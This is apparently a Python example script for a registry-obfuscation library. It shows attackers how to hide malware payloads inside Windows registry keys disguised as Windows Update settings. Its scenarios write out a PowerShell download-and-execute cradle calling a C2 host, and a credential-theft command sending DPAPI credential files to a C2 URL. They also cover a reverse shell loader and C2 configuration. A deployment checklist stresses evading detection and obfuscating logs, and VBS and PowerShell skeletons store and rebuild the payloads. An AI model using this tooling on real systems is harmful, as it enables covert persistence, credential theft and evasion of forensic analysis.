#!/usr/bin/env python3
"""
Practical Implementation Examples - Registry Key Hierarchy Obfuscation
Real-world usage scenarios and integration patterns
"""

import json
import hashlib
from registry_key_hierarchy_obfuscation import (
    KeyHierarchyObfuscator,
    HierarchyObfuscationConfig,
    HierarchyObfuscationType,
    LegitimatePathTemplate,
    RegistryHidingStrategyPresenter,
    DecoyGenerator,
)


class ScenarioRegistry:
    """Registry of real-world obfuscation scenarios"""

    @staticmethod
    def scenario_1_command_execution_payload():
        """
        Scenario 1: Hide command execution payload for persistence

        Payload: PowerShell command that executes at startup
        Requirement: Maximum legitimacy, must survive casual inspection
        Strategy: LEGITIMATE_PATH with Windows Update template
        """
        print("\n" + "=" * 80)
        print("SCENARIO 1: Command Execution Payload - Persistence")
        print("=" * 80)

        payload = (
            b"powershell.exe -WindowStyle Hidden -NoProfile "
            b"-ExecutionPolicy Bypass -Command "
            b"\"IEX(New-Object Net.WebClient).DownloadString('http://c2.local/stage2')\""
        )

        print(f"\n[PAYLOAD DETAILS]")
        print(f"Type: PowerShell Command (Execution)")
        print(f"Size: {len(payload)} bytes")
        print(f"Purpose: Download and execute second-stage payload at startup")
        print(f"Persistence: HKLM\\Run or HKCU\\Run (startup)")

        config = HierarchyObfuscationConfig(
            obfuscation_type=HierarchyObfuscationType.LEGITIMATE_PATH,
            base_path_template=LegitimatePathTemplate.WINDOWS_UPDATE,
            depth_levels=5,
            add_decoys=True,
            decoy_count=3,
            include_timestamps=True,
            include_win_versions=True
        )

        obfuscator = KeyHierarchyObfuscator(config)
        result = obfuscator.obfuscate(payload, "HKCU")

        print(f"\n[OBFUSCATION STRATEGY]")
        print(result.hiding_strategy)

        print(f"\n[DEPLOYMENT METHOD]")
        print("1. Write registry keys to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion")
        print("2. Create intermediate registry keys with generated names")
        print("3. Store payload chunks in standard value names (DisplayName, Description, etc.)")
        print("4. Create decoy paths that appear legitimate")
        print("5. Appears as Windows Update configuration to casual inspection")

        return result

    @staticmethod
    def scenario_2_credential_theft():
        """
        Scenario 2: Hide credential theft payload

        Payload: Encoded script to steal credentials and exfiltrate
        Requirement: Cryptographically strong, seed-based protection
        Strategy: HASH_CHAIN with custom seed
        """
        print("\n" + "=" * 80)
        print("SCENARIO 2: Credential Theft Payload - Cryptographic Storage")
        print("=" * 80)

        payload = (
            b"Get-ChildItem $env:APPDATA\\Microsoft\\Credentials | "
            b"ForEach-Object{[System.IO.File]::ReadAllBytes($_.FullName)} | "
            b"Out-File -Path http://c2.local/exfil -Encoding Byte"
        )

        print(f"\n[PAYLOAD DETAILS]")
        print(f"Type: Credential Enumeration & Exfiltration")
        print(f"Size: {len(payload)} bytes")
        print(f"Purpose: Enumerate credentials and send to C2 server")
        print(f"Target: DPAPI-protected credential files")

        # Use deterministic seed for reproducibility
        seed = hashlib.sha256(b"classified_operation_2026").digest()

        config = HierarchyObfuscationConfig(
            obfuscation_type=HierarchyObfuscationType.HASH_CHAIN,
            depth_levels=8,
            hash_chain_length=8,
            add_decoys=True,
            decoy_count=5,
            mutation_seed=seed
        )

        obfuscator = KeyHierarchyObfuscator(config)
        result = obfuscator.obfuscate(payload, "HKLM")

        print(f"\n[OBFUSCATION STRATEGY]")
        print(result.hiding_strategy)

        print(f"\n[SECURITY PROPERTIES]")
        print(f"Seed Hash: {hashlib.sha256(seed).hexdigest()[:16]}")
        print(f"Seed Requirement: CRITICAL - Cannot reconstruct without seed")
        print(f"Path Entropy: HIGH - Each component derived from cryptographic hash")
        print(f"Detector Bypass: Medium - Paths appear procedurally generated")

        print(f"\n[OPERATIONAL NOTES]")
        print("1. Seed must be stored separately (not in same registry)")
        print("2. Seed could be embedded in deployment script")
        print("3. Seed could be derived from system identifiers (HWID, MAC, etc.)")
        print("4. Requires knowledge of seed to reconstruct path structure")

        return result

    @staticmethod
    def scenario_3_reverse_shell_loader():
        """
        Scenario 3: Hide reverse shell loader payload

        Payload: Embedded reverse shell executable loader
        Requirement: Distributed storage across multiple locations
        Strategy: DEPTH_VARIATION with multiple storage paths
        """
        print("\n" + "=" * 80)
        print("SCENARIO 3: Reverse Shell Loader - Distributed Storage")
        print("=" * 80)

        # Simulate a reverse shell loader (simplified)
        payload = (
            b"\x4d\x5a\x90\x00"  # MZ header (PE executable)
            b"LoaderStub..."  # Loader stub
            b"ReverseSh3llEmbedded..."  # Embedded reverse shell
        )

        print(f"\n[PAYLOAD DETAILS]")
        print(f"Type: Executable Reverse Shell Loader")
        print(f"Size: {len(payload)} bytes")
        print(f"Format: PE executable (starts with MZ header)")
        print(f"Purpose: Load and execute reverse shell")

        config = HierarchyObfuscationConfig(
            obfuscation_type=HierarchyObfuscationType.DEPTH_VARIATION,
            depth_levels=4,
            add_decoys=True,
            decoy_count=4
        )

        obfuscator = KeyHierarchyObfuscator(config)
        result = obfuscator.obfuscate(payload, "HKCU")

        print(f"\n[OBFUSCATION STRATEGY]")
        print(result.hiding_strategy)

        print(f"\n[STORAGE DISTRIBUTION]")
        print("Chunks distributed across multiple registry paths:")
        for idx, (path, values) in enumerate(result.storage_map.items(), 1):
            print(f"  {idx}. {values}")

        print(f"\n[RECOVERY REQUIREMENTS]")
        print("1. Must discover all storage locations")
        print("2. Must read all value names in correct order")
        print("3. Must reassemble chunks in correct sequence")
        print("4. Distributed approach increases complexity for forensic analysis")

        return result

    @staticmethod
    def scenario_4_c2_configuration():
        """
        Scenario 4: Hide C2 configuration data

        Payload: Encrypted C2 configuration and communication parameters
        Requirement: Content-based integrity binding
        Strategy: NAME_MUTATION with integrity verification
        """
        print("\n" + "=" * 80)
        print("SCENARIO 4: C2 Configuration - Integrity-Bound Storage")
        print("=" * 80)

        config_data = {
            "c2_servers": ["c2-1.local:443", "c2-2.local:8443"],
            "encryption_key": "0x123456789abcdef",
            "beacon_interval": 3600,
            "proxy": "proxy.corp.local:8080",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        payload = json.dumps(config_data).encode()

        print(f"\n[PAYLOAD DETAILS]")
        print(f"Type: C2 Configuration JSON")
        print(f"Size: {len(payload)} bytes")
        print(f"Content:")
        print(json.dumps(config_data, indent=2))

        config = HierarchyObfuscationConfig(
            obfuscation_type=HierarchyObfuscationType.NAME_MUTATION,
            depth_levels=5,
            add_decoys=True,
            decoy_count=2
        )

        obfuscator = KeyHierarchyObfuscator(config)
        result = obfuscator.obfuscate(payload, "HKCU")

        print(f"\n[OBFUSCATION STRATEGY]")
        print(result.hiding_strategy)

        print(f"\n[INTEGRITY BINDING PROPERTY]")
        print("If configuration changes:")
        print("  Old Config → Path A + Values [V1, V2, V3]")
        print("  New Config → Path B + Values [W1, W2, W3]  (COMPLETELY DIFFERENT)")
        print("\nThis allows detection of unauthorized configuration changes")
        print("because the registry path structure itself changes with content")

        return result

    @staticmethod
    def scenario_5_polymorphic_malware():
        """
        Scenario 5: Hide polymorphic malware payload

        Payload: Polymorphic malware loader that changes with each run
        Requirement: Composite approach with randomization
        Strategy: COMPOSITE using multiple obfuscation techniques
        """
        print("\n" + "=" * 80)
        print("SCENARIO 5: Polymorphic Malware - Multi-Technique Storage")
        print("=" * 80)

        payload = (
            b"Polymorphic Engine: XOR(payload, random_key[0:32])"
            b"Encoded: Base64(AES-256-CBC(shellcode, derived_key))"
            b"Mutated: Apply LLVM code transformation to obfuscate logic"
        )

        print(f"\n[PAYLOAD DETAILS]")
        print(f"Type: Polymorphic Malware Loader")
        print(f"Size: {len(payload)} bytes")
        print(f"Characteristics:")
        print(f"  - Changes on each execution")
        print(f"  - Uses multiple encoding schemes")
        print(f"  - Applies control flow obfuscation")

        config = HierarchyObfuscationConfig(
            obfuscation_type=HierarchyObfuscationType.COMPOSITE,
            depth_levels=6,
            add_decoys=True,
            decoy_count=6
        )

        # Generate multiple variations
        print(f"\n[GENERATING POLYMORPHIC VARIANTS]")
        print("Creating 3 different storage instances with different obfuscation techniques:\n")

        for variant_num in range(3):
            obfuscator = KeyHierarchyObfuscator(config)
            result = obfuscator.obfuscate(payload, "HKCU")

            obf_type = result.obfuscated_paths[0].obfuscation_type.value
            path_hash = hashlib.sha256(result.obfuscated_paths[0].full_path.encode()).hexdigest()[:8]

            print(f"Variant {variant_num + 1}:")
            print(f"  Technique: {obf_type}")
            print(f"  Path Hash: {path_hash}")
            print(f"  Decoys: {len(result.decoy_structure)}")
            print()

        print("[DETECTION COMPLEXITY]")
        print("- Each variant uses different obfuscation technique")
        print("- Detection system must recognize all 6 techniques")
        print("- Polymorphic nature defeats signature-based detection")
        print("- Requires behavioral analysis for reliable detection")

    @staticmethod
    def scenario_6_data_exfiltration():
        """
        Scenario 6: Hide staged data exfiltration payload

        Payload: Compressed sensitive data ready for exfiltration
        Requirement: High capacity, multiple staging points
        Strategy: INTERLEAVED_PATH with legitimate components
        """
        print("\n" + "=" * 80)
        print("SCENARIO 6: Data Exfiltration Staging - Interleaved Storage")
        print("=" * 80)

        # Simulate compressed sensitive data
        sensitive_data = (
            b"[CLASSIFIED] Employee List: "
            b"admin_accounts:10, user_accounts:500, "
            b"Database credentials: Server=sql.internal:1433, ..."
        )

        print(f"\n[PAYLOAD DETAILS]")
        print(f"Type: Compressed Sensitive Data (Pre-Exfiltration)")
        print(f"Size: {len(sensitive_data)} bytes")
        print(f"Contents: Employee list, credentials, configuration")
        print(f"Stage: Staged in registry before exfiltration")

        config = HierarchyObfuscationConfig(
            obfuscation_type=HierarchyObfuscationType.INTERLEAVED_PATH,
            depth_levels=5,
            interleave_ratio=0.6,
            add_decoys=True,
            decoy_count=4
        )

        obfuscator = KeyHierarchyObfuscator(config)
        result = obfuscator.obfuscate(sensitive_data, "HKCU")

        print(f"\n[OBFUSCATION STRATEGY]")
        print(result.hiding_strategy)

        print(f"\n[STAGING WORKFLOW]")
        print("1. Exfiltration agent collects sensitive data")
        print("2. Data compressed and encrypted")
        print("3. Data stored in interleaved registry path")
        print("4. Real and fake components mixed for confusion")
        print("5. Exfiltration module retrieves in stages")
        print("6. Each stage deletes value, preventing recovery")

        return result


class ImplementationGuide:
    """Practical implementation guide with code examples"""

    @staticmethod
    def print_implementation_checklist():
        """Print implementation checklist"""
        print("\n" + "=" * 80)
        print("IMPLEMENTATION CHECKLIST")
        print("=" * 80)

        checklist = {
            "Configuration": [
                "Choose obfuscation type based on threat model",
                "Set depth levels (4-8 recommended)",
                "Configure decoy settings (3-6 decoys recommended)",
                "Generate or provide mutation seed if needed",
                "Select registry hive (HKCU vs HKLM)",
            ],
            "Payload Preparation": [
                "Encode payload if necessary (base64, hex)",
                "Split large payloads into chunks",
                "Calculate payload size for storage planning",
                "Prepare reconstruction mechanism",
            ],
            "Storage": [
                "Create registry path components",
                "Generate value names (5-10 names)",
                "Write chunks to registry values",
                "Verify write operations",
                "Test retrieval workflow",
            ],
            "Obfuscation": [
                "Generate decoy paths",
                "Add realistic timestamps",
                "Include Windows version compatibility",
                "Document hiding strategy",
                "Store reconstruction hints (securely)",
            ],
            "Deployment": [
                "Package payload with deployment script",
                "Embed configuration in script",
                "Test on target system",
                "Verify persistence",
                "Monitor for detection",
            ],
            "Forensics Handling": [
                "Understand detection signatures",
                "Monitor forensic tool updates",
                "Plan counter-detection measures",
                "Consider log obfuscation",
                "Plan cleanup/removal operations",
            ],
        }

        for section, items in checklist.items():
            print(f"\n[{section.upper()}]")
            for idx, item in enumerate(items, 1):
                print(f"  {idx}. {item}")

    @staticmethod
    def print_vbs_skeleton():
        """Print VBS skeleton for registry operations"""
        print("\n" + "=" * 80)
        print("VBS SKELETON FOR REGISTRY OPERATIONS")
        print("=" * 80)

        vbs_code = '''
' VBS Registry Obfuscation Skeleton
' Author: Implementation Guide
' Purpose: Store and retrieve obfuscated payload from registry

Option Explicit

Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1
Const REG_BINARY = 3

Function StorePayload(regHive, regPath, valueName, payloadHex)
    Dim registry, regKey
    Set registry = CreateObject("WScript.Shell")

    ' Convert hex to binary if needed
    Dim binaryData
    binaryData = HexToBytes(payloadHex)

    ' Write to registry
    registry.RegWrite regHive & "\" & regPath & "\" & valueName, binaryData, "REG_BINARY"

    Set registry = Nothing
End Function

Function RetrievePayload(regHive, regPath, valueName)
    Dim registry, regKey, payload
    Set registry = CreateObject("WScript.Shell")

    ' Read from registry
    On Error Resume Next
    payload = registry.RegRead(regHive & "\" & regPath & "\" & valueName)

    If Err.Number <> 0 Then
        RetrievePayload = ""
    Else
        RetrievePayload = payload
    End If

    Set registry = Nothing
End Function

Function ReconstructPayload(chunks, order)
    Dim result, i
    result = ""

    ' Reconstruct from chunks in correct order
    For i = LBound(order) To UBound(order)
        result = result & chunks(order(i))
    Next

    ReconstructPayload = result
End Function

Function HexToBytes(hexString)
    Dim i, result
    result = ""

    For i = 1 To Len(hexString) - 1 Step 2
        result = result & Chr(CLng("&H" & Mid(hexString, i, 2)))
    Next

    HexToBytes = result
End Function

' Main execution
Dim payloadPath, payloadValues, chunks, i

payloadPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Update"
payloadValues = Array("DisplayName", "Description", "Version", "Publisher")

Dim registry
Set registry = CreateObject("WScript.Shell")

' Store example payload
For i = LBound(payloadValues) To UBound(payloadValues)
    Call StorePayload("HKCU", payloadPath, payloadValues(i), "")
Next

' Retrieve and reconstruct
For i = LBound(payloadValues) To UBound(payloadValues)
    chunks(i) = RetrievePayload("HKCU", payloadPath, payloadValues(i))
Next

Dim reconstructed
reconstructed = ReconstructPayload(chunks, Array(0, 1, 2, 3))

Set registry = Nothing
'''

        print(vbs_code)

    @staticmethod
    def print_powershell_skeleton():
        """Print PowerShell skeleton for registry operations"""
        print("\n" + "=" * 80)
        print("POWERSHELL SKELETON FOR REGISTRY OPERATIONS")
        print("=" * 80)

        ps_code = '''
# PowerShell Registry Obfuscation Skeleton
# Author: Implementation Guide
# Purpose: Store and retrieve obfuscated payload from registry

function Store-ObfuscatedPayload {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$RegistryHive,

        [Parameter(Mandatory=$true)]
        [string]$RegistryPath,

        [Parameter(Mandatory=$true)]
        [string]$ValueName,

        [Parameter(Mandatory=$true)]
        [byte[]]$PayloadData
    )

    $fullPath = "Registry::${RegistryHive}${RegistryPath}"

    # Create registry path if needed
    if (-not (Test-Path -Path $fullPath)) {
        New-Item -Path $fullPath -Force | Out-Null
    }

    # Store payload
    Set-ItemProperty -Path $fullPath -Name $ValueName -Value $PayloadData -Type Binary
}

function Retrieve-ObfuscatedPayload {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$RegistryHive,

        [Parameter(Mandatory=$true)]
        [string]$RegistryPath,

        [Parameter(Mandatory=$true)]
        [string]$ValueName
    )

    $fullPath = "Registry::${RegistryHive}${RegistryPath}"

    # Retrieve payload
    $payload = Get-ItemProperty -Path $fullPath -Name $ValueName -ErrorAction SilentlyContinue

    if ($payload) {
        return $payload.$ValueName
    }
    return $null
}

function Reconstruct-Payload {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[][]]$Chunks,

        [Parameter(Mandatory=$true)]
        [int[]]$Order
    )

    $result = @()

    foreach ($index in $Order) {
        $result += $Chunks[$index]
    }

    return [byte[]]$result
}

# Main execution
$registryHive = "HKCU"
$registryPath = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Update"
$valueNames = @("DisplayName", "Description", "Version", "Publisher")

# Store payload chunks
foreach ($valueName in $valueNames) {
    $payloadChunk = [System.Text.Encoding]::ASCII.GetBytes("PAYLOAD_CHUNK")
    Store-ObfuscatedPayload -RegistryHive $registryHive `
                           -RegistryPath $registryPath `
                           -ValueName $valueName `
                           -PayloadData $payloadChunk
}

# Retrieve and reconstruct
$chunks = @()
foreach ($valueName in $valueNames) {
    $chunk = Retrieve-ObfuscatedPayload -RegistryHive $registryHive `
                                       -RegistryPath $registryPath `
                                       -ValueName $valueName
    $chunks += $chunk
}

# Reconstruct in correct order
$order = @(0, 1, 2, 3)
$reconstructed = Reconstruct-Payload -Chunks $chunks -Order $order
'''

        print(ps_code)


def main():
    """Run all scenarios"""
    print("\n" + "=" * 80)
    print("REGISTRY KEY HIERARCHY OBFUSCATION - PRACTICAL SCENARIOS")
    print("=" * 80)

    # Run scenarios
    ScenarioRegistry.scenario_1_command_execution_payload()
    ScenarioRegistry.scenario_2_credential_theft()
    ScenarioRegistry.scenario_3_reverse_shell_loader()
    ScenarioRegistry.scenario_4_c2_configuration()
    ScenarioRegistry.scenario_5_polymorphic_malware()
    ScenarioRegistry.scenario_6_data_exfiltration()

    # Print implementation guides
    ImplementationGuide.print_implementation_checklist()
    ImplementationGuide.print_vbs_skeleton()
    ImplementationGuide.print_powershell_skeleton()

    print("\n" + "=" * 80)
    print("ALL SCENARIOS COMPLETED")
    print("=" * 80)


if __name__ == "__main__":
    main()
